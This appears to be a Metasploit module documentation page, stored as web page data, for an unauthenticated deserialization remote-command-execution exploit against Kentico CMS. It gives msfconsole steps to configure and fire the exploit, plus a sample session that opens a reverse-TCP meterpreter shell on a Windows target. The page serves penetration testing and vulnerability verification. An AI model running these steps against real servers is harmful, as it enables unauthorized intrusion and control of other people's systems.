{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/http/kentico_staging_syncserver","result":{"data":{"moduleMetadataJson":{"id":"0e52facd-0904-59b5-8c74-97beec9e09e3","name":"Kentico CMS Staging SyncServer Unserialize Remote Command Execution","fullname":"exploit/windows/http/kentico_staging_syncserver","description":"This module exploits a vulnerability in the Kentico CMS platform versions 12.0.14 and earlier.\n        Remote Command Execution is possible via unauthenticated XML requests to the Staging Service\n        SyncServer.asmx interface ProcessSynchronizationTaskData method stagingTaskData parameter. XML\n        input is passed to an insecure .NET deserialize call which allows for remote command execution.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/http/kentico_staging_syncserver","documentationSlug":"/modules/documentation/exploit/windows/http/kentico_staging_syncserver","referencesSlug":"/modules/references/exploit/windows/http/kentico_staging_syncserver"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p><a href=\"www.kentico.com\">Kentico CMS</a> CMS platform versions 12.0.14 and earlier are\naffected by an unauthenticated deserialization vulnerability in the Staging\nService which can be leveraged by an attacker to execute arbitrary commands in\nthe context of the target server process (usually either <code class=\"language-text\">NT AUTHORITY\\NETWORK\nSERVICE</code> or <code class=\"language-text\">NT AUTHORITY\\SYSTEM</code>). The vulnerability is triggered\nby sending a HTTP POST request to the SyncServer.asmx interface\n<code class=\"language-text\">ProcessSynchronizationTaskData</code> method <code class=\"language-text\">stagingTaskData</code> parameter request path\nin HTTP GET requests sent to the built-in web server. This module has been\ntested successfully on Windows 10 using exec and adduser payloads against\nKentico v11.</p>\n<p>The vulnerable application is available for download at:</p>\n<ul>\n<li><a href=\"https://d82ujmuzqhypi.cloudfront.net/Kentico_11_0_trial.exe\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://d82ujmuzqhypi.cloudfront.net/Kentico_11_0_trial.exe</a></li>\n<li><a href=\"https://d82ujmuzqhypi.cloudfront.net/Kentico_12_0_trial.exe\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://d82ujmuzqhypi.cloudfront.net/Kentico_12_0_trial.exe</a></li>\n<li><a href=\"https://www.kentico.com/download-demo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.kentico.com/download-demo</a></li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install a vulnerable Kentico CMS Trial version.</li>\n<li>Access web instance admin interface at /admin/</li>\n<li>Default credentials are 'administrator' with blank password.</li>\n<li>Navigate to <code class=\"language-text\">Settings</code>, then expand <code class=\"language-text\">Settings</code> > <code class=\"language-text\">Versioning &amp; Synchronization</code> > <code class=\"language-text\">Staging</code></li>\n<li>Check <code class=\"language-text\">Enable Staging Service</code> and click <code class=\"language-text\">Save</code></li>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do <code class=\"language-text\">use exploit/windows/http/kentico_staging_syncserver</code></li>\n<li>Do <code class=\"language-text\">set RHOSTS ip</code> (Trial is limited to 127.0.0.1 remote HTTP clients, but paid versions are public websites)</li>\n<li>Do <code class=\"language-text\">set RPORT port</code> (installs with a random port within IISExpress for at least Trial versions)</li>\n<li>Do <code class=\"language-text\">check</code></li>\n<li>Verify the target is detected</li>\n<li>Do <code class=\"language-text\">set PAYLOAD cmd/windows/generic</code></li>\n<li>Do <code class=\"language-text\">set CMD calc</code></li>\n<li>Do <code class=\"language-text\">exploit</code></li>\n<li>Verify <code class=\"language-text\">calc.exe</code> launches. </li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"kentico-cms-v110-trial-on-windows-7-sp-1-x64\" style=\"position:relative;\"><a href=\"#kentico-cms-v110-trial-on-windows-7-sp-1-x64\" aria-label=\"kentico cms v110 trial on windows 7 sp 1 x64 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Kentico CMS v11.0 trial on Windows 7 SP 1 x64</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(windows/http/kentico_staging_syncserver) &gt; show options \n\nModule options (exploit/windows/http/kentico_staging_syncserver):\n\n   Name       Current Setting                              Required  Description\n   ----       ---------------                              --------  -----------\n   Proxies                                                 no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     192.168.159.31                               yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;\n   RPORT      80                                           yes       The target port (TCP)\n   SRVHOST    0.0.0.0                                      yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT    8080                                         yes       The local port to listen on.\n   SSL        false                                        no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                                                 no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI  /Kentico11/CMSPages/Staging/SyncServer.asmx  yes       Path to SyncServer.asmx\n   URIPATH                                                 no        The URI to use for this exploit (default is random)\n   VHOST      localhost                                    no        HTTP server virtual host\n\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)\n   LHOST     192.168.159.128  yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows EXE Dropper\n\n\nmsf5 exploit(windows/http/kentico_staging_syncserver) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.159.128:4444 \n[*] Command Stager progress -  24.99% done (2999/12002 bytes)\n[*] Command Stager progress -  49.98% done (5998/12002 bytes)\n[*] Command Stager progress -  74.96% done (8997/12002 bytes)\n[*] Sending stage (201283 bytes) to 192.168.159.31\n[*] Command Stager progress -  99.83% done (11982/12002 bytes)\n[*] Meterpreter session 2 opened (192.168.159.128:4444 -&gt; 192.168.159.31:51599) at 2020-05-04 09:51:29 -0400\n[*] Command Stager progress - 100.00% done (12002/12002 bytes)\n\nmeterpreter &gt; sysinfo\nComputer        : WIN-9NSI4A6AIHJ\nOS              : Windows 7 (6.1 Build 7601, Service Pack 1).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 1\nMeterpreter     : x64/windows\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\NETWORK SERVICE\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"notes\" style=\"position:relative;\"><a href=\"#notes\" aria-label=\"notes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Notes</h2>\n<ol>\n<li>The IISExpress config is located in ~/Documents/IISExpress/config/applicationhost.config</li>\n<li>Port number can be changed or allow remote access by replacing 'localhost' with '*'</li>\n<li>To run IIS on command line, C:\\PROGRA~1\\IIS Express\\iisexpress.exe /site:Kentico11 (etc)</li>\n<li>It might be possible to use a CmdStager or FileDropper but couldn't get it working in time. Might be a string limit and has issues with Unicode.</li>\n<li>Some reverse or bind payloads work if the environment is right.</li>\n<li>Other serialized injections are possible with <code class=\"language-text\">ysoserial.exe -f SoapFormatter</code> but untested.</li>\n</ol>"}}},"pageContext":{"id":"0e52facd-0904-59b5-8c74-97beec9e09e3"}}}